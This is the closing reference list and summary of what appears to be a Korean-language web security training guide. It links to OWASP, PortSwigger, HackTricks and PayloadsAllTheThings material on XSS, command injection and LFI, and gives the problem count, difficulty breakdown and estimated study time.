- **OWASP**: [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **OWASP**: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **PortSwigger**: [Web Security Academy](https://portswigger.net/web-security)
- **script 가이드**:
  - [Phase 2 - XSS](/script/phase2-vulnerability-basics/03-xss.md)
  - [Phase 2 - LFI](/script/phase2-vulnerability-basics/05-lfi.md)
- **HackTricks**: [XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- **PayloadsAllTheThings**: [XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

**문제 수**: 9개
**난이도 분포**: Beginner 1개 | Intermediate 4개 | Advanced 4개
**총 학습 시간**: 약 10-12시간
**마지막 업데이트**: 2026-01-14
